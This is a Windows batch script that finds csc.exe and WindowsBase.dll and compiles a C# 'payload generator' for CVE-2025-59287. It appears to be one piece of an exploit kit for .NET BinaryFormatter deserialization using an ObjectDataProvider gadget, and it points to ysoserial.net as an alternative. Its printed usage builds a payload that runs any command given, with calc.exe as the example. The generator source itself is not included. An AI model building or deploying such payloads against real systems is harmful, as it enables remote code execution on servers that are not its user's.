@echo off
REM Batch script to compile BinaryFormatterPayloadGenerator.cs on Windows
REM Requires .NET Framework SDK or Visual Studio

echo ============================================================
echo CVE-2025-59287 Payload Generator Compilation Script
echo ============================================================
echo.

REM Try to find csc.exe in common locations
set CSC_PATH=
if exist "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" (
    set CSC_PATH=C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
    goto :found
)
if exist "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" (
    set CSC_PATH=C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe
    goto :found
)
if exist "C:\Program Files (x86)\Microsoft Visual Studio\Installer\vswhere.exe" (
    for /f "tokens=*" %%i in ('"C:\Program Files (x86)\Microsoft Visual Studio\Installer\vswhere.exe" -latest -property installationPath') do (
        set VS_PATH=%%i
    )
    if defined VS_PATH (
        if exist "%VS_PATH%\MSBuild\Current\Bin\Roslyn\csc.exe" (
            set CSC_PATH=%VS_PATH%\MSBuild\Current\Bin\Roslyn\csc.exe
            goto :found
        )
    )
)

echo [!] Error: Could not find csc.exe (C# Compiler)
echo [!] Please install .NET Framework SDK or Visual Studio
echo [!] Or use ysoserial.net as an alternative
pause
exit /b 1

:found
echo [*] Found C# Compiler: %CSC_PATH%
echo.

REM Find WindowsBase.dll for ObjectDataProvider
set WINBASE_PATH=
if exist "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\WPF\WindowsBase.dll" (
    set WINBASE_PATH=C:\Windows\Microsoft.NET\Framework64\v4.0.30319\WPF\WindowsBase.dll
    goto :compile
)
if exist "C:\Windows\Microsoft.NET\Framework\v4.0.30319\WPF\WindowsBase.dll" (
    set WINBASE_PATH=C:\Windows\Microsoft.NET\Framework\v4.0.30319\WPF\WindowsBase.dll
    goto :compile
)
if exist "C:\Program Files\Reference Assemblies\Microsoft\Framework\.NETFramework\v4.0\WindowsBase.dll" (
    set WINBASE_PATH=C:\Program Files\Reference Assemblies\Microsoft\Framework\.NETFramework\v4.0\WindowsBase.dll
    goto :compile
)

echo [!] Warning: Could not find WindowsBase.dll
echo [!] Trying compilation without explicit reference...
echo [!] If compilation fails, locate WindowsBase.dll and update this script
set WINBASE_PATH=

:compile
echo [*] Compiling BinaryFormatterPayloadGenerator.cs...
echo.

if defined WINBASE_PATH (
    "%CSC_PATH%" /reference:"%WINBASE_PATH%" /out:BinaryFormatterPayloadGenerator.exe BinaryFormatterPayloadGenerator.cs
) else (
    "%CSC_PATH%" /out:BinaryFormatterPayloadGenerator.exe BinaryFormatterPayloadGenerator.cs
)

if %ERRORLEVEL% EQU 0 (
    echo.
    echo [+] Compilation successful!
    echo [+] Created: BinaryFormatterPayloadGenerator.exe
    echo.
    echo [*] Usage: BinaryFormatterPayloadGenerator.exe ^<command^>
    echo [*] Example: BinaryFormatterPayloadGenerator.exe calc.exe
) else (
    echo.
    echo [!] Compilation failed!
    echo [!] Make sure you have .NET Framework 4.0 or later installed
    echo [!] And that WindowsBase.dll is accessible
)

echo.
pause

